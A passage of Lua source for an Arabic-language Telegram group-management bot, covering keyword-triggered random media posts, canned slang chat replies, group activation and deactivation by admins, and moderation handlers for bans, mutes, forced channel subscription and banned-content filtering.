return https.request("https://api.telegram.org/bot"..Token.."/sendVoice?chat_id="..msg.chat_id.."&voice=https://t.me/werrtl/"..math.random(2,215).."&caption="..URL.escape("‹ : تم اختيار الميمز لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "راب" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVoice?chat_id="..msg.chat_id.."&voice=https://t.me/rderil/"..math.random(2,148).."&caption="..URL.escape("‹ : تم اختيار الراب لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "ريمكس" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVoice?chat_id="..msg.chat_id.."&voice=https://t.me/erweri/"..math.random(2,215).."&caption="..URL.escape("‹ : تم اختيار الريمكس لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "فيديو" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVideo?chat_id="..msg.chat_id.."&video=https://t.me/LKKKKT/"..math.random(2,78).."&caption="..URL.escape("‹ : تم ختيار الفيديو لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "متحركه" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendAnimation?chat_id="..msg.chat_id.."&animation=https://t.me/LKKKKR/"..math.random(2,143).."&caption="..URL.escape("‹ : تم اختيار المتحركه لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "فلم" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVideo?chat_id="..msg.chat_id.."&video=https://t.me/RRRRRTQ/"..math.random(2,86).."&caption="..URL.escape("‹ : تم اختيار الفلم لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "كارتون" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVideo?chat_id="..msg.chat_id.."&video=https://t.me/kartonn220/"..math.random(2,86).."&caption="..URL.escape("‹ : تم اختيار الكارتون لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "رمزيه" or text == "صوره" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendPhoto?chat_id="..msg.chat_id.."&photo=https://t.me/zezesu/"..math.random(2,107).."&caption="..URL.escape("‹ : تم اختيار الصوره لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "انمي"  and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendPhoto?chat_id="..msg.chat_id.."&photo=https://t.me/anmee344/"..math.random(2,107).."&caption="..URL.escape("‹ : تم اختيار الصوره لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if text == "هلو" or text == "هلاو" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"هـلابـيك قـلبـي نـورت💘","هـلاوات يحات مـسيوو وايد💘😻","هـلابـيك/ج يـحـيلـي🥺","هـلاوات عمࢪيي مـسيو كـلش كـلش🥺💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "شلونكم" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"تـمـام عمࢪيي نتا ڪيفڪ💘💋","تـمام ونت گـيفـك قـلبـي💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "شلونك" or text == "شلونج" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"عمࢪࢪيي قـميـل بخيࢪ اذا حـلو بخيࢪ💘🙊","بـخيـر يـحيـلي ونـت💘","الحمدلله انت/ي شـخبارك/ج☹️"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "تمام" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"تـدوم عمࢪيي💘","دومـك/ج قـلبـي💘","دومـك/ج ياربي☹️","يـدوم احـبابـك/ج🥺"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "😐" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"شـبي حـلـو صـافـن😻💋","لـيش حـلـو صـافـن😹🥺"," لاتـصـفـن عـمـࢪيي😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "هاي" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"هـايـات يلصاڪ نـوࢪتـنـا💘","هـايـا يـحـلو انـرت🥺✨"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "اريد اكبل" or text == "اريد ارتبط" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"امـشي وخࢪ مـنـا يدوࢪ تـڪـبيل😏","وخـࢪ مـنـا مـاࢪيـد زواحـف😹","ادعـبل ابـنـي😚","اࢪتـبـط مـحـد لازمـك🙊","خـل اࢪتـبـط انـي بالاول😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "ريد ازحف" or text == "ازحفلج" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"شـعليڪ بـي عمࢪيي خـلي يـزحف💘☹️","عـيـب ابـنـي😐😹","شـگـبـࢪگ شـعـرضـك تـزحـف😹😕","بـعـدگ زغـيـࢪ ع زحـف ابـنـي😹😒"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "كلخرا" or text == "اكليخرا" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"اسـف عمࢪيي مـا خليڪ بـحـلڪي😹💘","خـلـي ࢪوحـك مـاعـون 😹😘","اوگ اكــلـتـك/ج😹😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "دي" or text == "دد" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"امـشـيڪ بـيها عمࢪيي"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "فروخ" or text == "فرخ" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"ويـنـه بـلـه خـل حـصـࢪه😹🤤","ويـنـه بـلـه خـل تـفـل عـلـيه💦😗"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "تعي خاص" or text == "خ" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"هااا يـول اخـذتـها خـاص😹🙊","گـفـو اخـذتـهـا خـاص😉😹","بـخـت ࢪاحـو خـاص😭"}

bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "اكرهج" or text == "اكرهك" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"عـساس انـي مـيـت بيڪڪ دمـشـي لڪ😿😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "احبك" or text == "احبج" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"يـحـياتـي وانـي هـم حـبـڪڪ🙈💋"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "باي" or text == "بايي" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"ويـن رايـح عمࢪيي خـلـينـا مـونـسـيـن🥺💘","لله وياگ ضـلـعي😗","سـد بـاب وࢪاگ😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "عوائل" or text == "صايره عوائل" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"عمࢪيي الـحلـو انـي ويـاڪ نـسـولف🥺😻","حـبيـبي ولله ࢪبـط فـيـشه ويـانـا🙈💋"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end

if text == "واكف" or text == "بوت واكف" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"شـغال عمࢪيي🤓💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "ون مدير" or text == "وين مدير" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"عمࢪيي تـفـضل وياڪ مـديـࢪ💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "نجب" or text == "انجب" or text == "انجبي" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"صـاࢪ عمࢪيي💘🥺","لش عـمࢪيي شـسويت☹️💔"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "تحبيني" or text == "تحبني" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"سـؤال صـعـب خلـيـني افڪࢪ☹️"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "صباحو" or text == "صباح الخير" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"يـمـه فـديـت صباحڪ 💋🙈","صـباح قـشطه واللوز للحـلو💋🙊"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "كفو" or text == "كفوو" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"ڪـفـو مـنڪ عمࢪيي💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "شسمج" or text == "شسمك" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"اسـمـي احـلاهـن واتـحداهـن😹😹💘","اسـمـي صڪاࢪ بـنـات😗💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "مساء الخير" or text == "مسائو" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"مـساء العـافـيه عمࢪيي🥺","مسـآء الـياسـمين💋💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "رايح للمدرسه" or text == "مدرسه" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"لاجـيـب اسـمـها لاسـطࢪڪ😏😹"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "هههه" or text == "ههههه" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"فـدوا عـساا دوم💘","ضڪه تࢪد ࢪوح دايـمه عمغࢪيي🙈💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
if text == "احبجج" or text == "حبج" then
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
return bot.sendText(msg.chat_id,msg.id,"md",true)  
end
nameBot = {"جـذاب تࢪا يـضـحڪ علـيـج😼💘"}
bot.sendText(msg.chat_id,msg.id," .*"..nameBot[math.random(#nameBot)].." .*","md",true)  
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
-- نهايه التفعيل
if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then 
local Text = "*‹ : WeLCoMe To FSouRce u  .*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '‹ : SouRce u .',url="https://t.me/FeLX_TEaM"}},
{{text = '‹ : inFo u .',url="https://t.me/info_source"}},
{{text = '‹ : CoDeR .',url="https://t.me/sSs_sSs"}},
}
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/FeLX_TEaM&caption=".. URL.escape(Text).."&photo=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----------------------------------------------------------------------------------------------------
if text == 'تفعيل' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذراً البوت ليس ادمن في المجموعه .*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,msg.sender.user_id)
if not developer(msg) then
if sm.status.luatele ~= "chatMemberStatusCreator" and sm.status.luatele ~= "chatMemberStatusAdministrator" then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذراً يجب أنْ تكون مشرف او مالك المجموعه .*","md",true)  
return false
end
end
if sm.status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",msg.sender.user_id)
else
redis:sadd(bot_id..":"..msg.chat_id..":Status:Administrator",msg.sender.user_id)
end
if redis:sismember(bot_id..":Groups",msg.chat_id) then
 bot.sendText(msg.chat_id,msg.id,'*‹ : تم تفعيل المجموعه سابقا* .',"md",true)  
return false
else
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
UserInfo = bot.getUser(msg.sender.user_id).first_name
bot.sendText(sudoid,0,'*\n‹ : تم تفعيل مجموعه جديده \n‹ : بواسطه : (*['..UserInfo..'](tg://user?id='..msg.sender.user_id..')*)\n‹ : معلومات المجموعه :\n‹ : عدد الاعضاء : '..Info_Chats.member_count..'\n‹ : عدد الادمنيه : '..Info_Chats.administrator_count..'\n‹ : عدد المطرودين : '..Info_Chats.banned_count..'\n‹ : عدد المقيدين : '..Info_Chats.restricted_count..'\n‹ : الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
bot.sendText(msg.chat_id,msg.id,'*‹ : تم تفعيل المجموعه بنجاح .*',"md", true, false, false, false, reply_markup)
redis:sadd(bot_id..":Groups",msg.chat_id)
end
end
if text == 'تعطيل' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذراً البوت ليس ادمن في المجموعه .*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,msg.sender.user_id)
if not developer(msg) then
if sm.status.luatele ~= "chatMemberStatusCreator" then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذراً يجب أنْ تكون مالك المجموعه فقط .*","md",true)  
return false
end
end
if redis:sismember(bot_id..":Groups",msg.chat_id) then
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},
}
}
UserInfo = bot.getUser(msg.sender.user_id).first_name
bot.sendText(sudoid,0,'*\n‹ : تم تعطيل المجموعه التاليه : \n‹ : بواسطه : (*['..UserInfo..'](tg://user?id='..msg.sender.user_id..')*)\n‹ : معلومات المجموعه :\n‹ : عدد الاعضاء : '..Info_Chats.member_count..'\n‹ : عدد الادمنيه : '..Info_Chats.administrator_count..'\n‹ : عدد المطرودين : '..Info_Chats.banned_count..'\n‹ : عدد المقيدين : '..Info_Chats.restricted_count..'\n‹ : الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
bot.sendText(msg.chat_id,msg.id,'*‹ : تم تعطيل المجموعه بنجاح .*',"md",true, false, false, false, reply_markup)
redis:srem(bot_id..":Groups",msg.chat_id)
local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
redis:del(bot_id..":"..msg.chat_id..":Status:Creator")
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
redis:del(bot_id.."List:Command:"..msg.chat_id)
for i = 1, #keys do 
redis:del(keys[i])
end
return false
else
bot.sendText(msg.chat_id,msg.id,'*‹ : المجموعه معطله بالفعل .*',"md", true)
end
end
----------------------------------------------------------------------------------------------------
end --- end Run
end --- end Run
----------------------------------------------------------------------------------------------------
function Call(data)
if redis:get(bot_id..":Notice") then
if data and data.luatele and data.luatele == "updateSupergroup" then
local Get_Chat = bot.getChat('-100'..data.supergroup.id)
if data.supergroup.status.luatele == "chatMemberStatusBanned" then
redis:srem(bot_id..":Groups",'-100'..data.supergroup.id)
local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
redis:del(bot_id..":-100"..data.supergroup.id..":Status:Creator")
redis:del(bot_id..":-100"..data.supergroup.id..":Status:BasicConstructor")
redis:del(bot_id..":-100"..data.supergroup.id..":Status:Constructor")
redis:del(bot_id..":-100"..data.supergroup.id..":Status:Owner")
redis:del(bot_id..":-100"..data.supergroup.id..":Status:Administrator")
redis:del(bot_id..":-100"..data.supergroup.id..":Status:Vips")
redis:del(bot_id.."List:Command:"..'-100'..data.supergroup.id)
for i = 1, #keys do 
redis:del(keys[i])
end
Get_Chat = bot.getChat('-100'..data.supergroup.id)
Info_Chats = bot.getSupergroupFullInfo('-100'..data.supergroup.id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},
}
}
return bot.sendText(sudoid,0,'‹ : تم طرد البوت من مجموعه جديده\n‹ : معلومات المجموعه :\n‹ : الايدي : ( -100'..data.supergroup.id..' )\n*‹ : عدد الاعضاء : '..Info_Chats.member_count..'\n‹ : عدد الادمنيه : '..Info_Chats.administrator_count..'\n‹ : عدد المطرودين : '..Info_Chats.banned_count..'\n‹ : عدد المقيدين : '..Info_Chats.restricted_count..'\n‹ : الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md",true, false, false, false, reply_markup)
end
end
end
print(serpent.block(data, {comment=false}))   
if data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.sender.luatele == "messageSenderChat" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:messageSenderChat") == "del" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
return false
end
end
if data.message.sender.luatele ~= "messageSenderChat" then
if tonumber(data.message.sender.user_id) ~= tonumber(bot_id) then  
if data.message.content.text and data.message.content.text.text:match("^(.*)$") then
if redis:get(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Command:del") == "true" then
redis:del(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Command:del")
if redis:get(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text) then
redis:del(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text)
redis:srem(bot_id.."List:Command:"..data.message.chat_id,data.message.content.text.text)
t = "‹ : تم حذف الامر بنجاح"
else
t = " ‹ : عذراً الامر  ( "..data.message.content.text.text.." ) غير موجود "
end
bot.sendText(data.message.chat_id,data.message.id,"*"..t.."*","md",true)  
end
end
if data.message.content.text then
local NewCmd = redis:get(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text)
if NewCmd then
data.message.content.text.text = (NewCmd or data.message.content.text.text)
end
end
if data.message.content.text then
td = data.message.content.text.text
if redis:get(bot_id..":TheCh") then
infokl = bot.getChatMember(redis:get(bot_id..":TheCh"),bot_id)
if infokl and infokl.status and infokl.status.luatele == "chatMemberStatusAdministrator" then
if not devS(data.message.sender.user_id) then
if td == "/start" or  td == "ايدي" or  td == "الرابط" or  td == "قفل الكل" or  td == "فتح الكل" or  td == "الاوامر" or  td == "م1" or  td == "م2" or  td == "م3" or  td == "كشف" or  td == "رتبتي" or  td == "المنشئ" or  td == "قفل الصور" or  td == "قفل الالعاب" or  td == "الالعاب" or  td == "العكس" or  td == "روليت" or  td == "كت" or  td == "تنزيل الكل" or  td == "رفع ادمن" or  td == "رفع مميز" or  td == "رفع منشئ" or  td == "المكتومين" or  td == "قفل المتحركات"  then
if bot.getChatMember(redis:get(bot_id..":TheCh"),data.message.sender.user_id).status.luatele == "chatMemberStatusLeft" then
Get_Chat = bot.getChat(redis:get(bot_id..":TheCh"))
Info_Chats = bot.getSupergroupFullInfo(redis:get(bot_id..":TheCh"))
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link and  Get_Chat and Get_Chat.title then 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = Get_Chat.title,url=Info_Chats.invite_link.invite_link}},
}
}
return bot.sendText(data.message.chat_id,data.message.id,Reply_Status(data.message.sender.user_id,"*‹ : عليك الاشتراك في قناة البوت اولاً ! .*").yu,"md", true, false, false, false, reply_dev)
end
end
end
end
end
end
end
if redis:sismember(bot_id..":bot:Ban", data.message.sender.user_id) then    
if GetInfoBot(data.message).BanUser then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif GetInfoBot(data.message).BanUser == false then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end  
if redis:sismember(bot_id..":bot:silent", data.message.sender.user_id) then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end  
if redis:sismember(bot_id..":"..data.message.chat_id..":silent", data.message.sender.user_id) then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})  
end
if redis:sismember(bot_id..":"..data.message.chat_id..":Ban", data.message.sender.user_id) then    
if GetInfoBot(data.message).BanUser then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif GetInfoBot(data.message).BanUser == false then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end 
if redis:sismember(bot_id..":"..data.message.chat_id..":restrict", data.message.sender.user_id) then    
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
end  
if not Administrator(msg) then
if data.message.content.text then
hash = redis:sismember(bot_id.."mn:content:Text"..data.message.chat_id, data.message.content.text.text)
tu = "الرساله"
ut = "ممنوعه"
elseif data.message.content.sticker then
hash = redis:sismember(bot_id.."mn:content:Sticker"..data.message.chat_id, data.message.content.sticker.sticker.remote.unique_id)
tu = "الملصق"
ut = "ممنوع"
elseif data.message.content.animation then
hash = redis:sismember(bot_id.."mn:content:Animation"..data.message.chat_id, data.message.content.animation.animation.remote.unique_id)
tu = "المتحركه"
ut = "ممنوعه"
elseif data.message.content.photo then
hash = redis:sismember(bot_id.."mn:content:Photo"..data.message.chat_id, data.message.content.photo.sizes[1].photo.remote.unique_id)
tu = "الصوره"
ut = "ممنوعه"
end
if hash then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
bot.sendText(data.message.chat_id,data.message.id,Reply_Status(data.message.sender.user_id,"*‹ : "..tu.." "..ut.." من المجموعه .*").yu,"md",true)  
end
end
if data.message and data.message.content then
if data.message.content.luatele == "messageUnsupported" or data.message.content.luatele == "messageSticker" or data.message.content.luatele == "messageContact" or data.message.content.luatele == "messageVideoNote" or data.message.content.luatele == "messageDocument" or data.message.content.luatele == "messageVideo" or data.message.content.luatele == "messageAnimation" or data.message.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..data.message.chat_id..":mediaAude:ids",data.message.id)  
end
end
Run(data.message,data)
if data.message.content.text then
if data.message.content.text and not redis:sismember(bot_id..'Spam:Group'..data.message.sender.user_id,data.message.content.text.text) then
redis:del(bot_id..'Spam:Group'..data.message.sender.user_id) 
end
end 
if data.message.content.luatele == "messageChatJoinByLink" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "del" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "ked" then
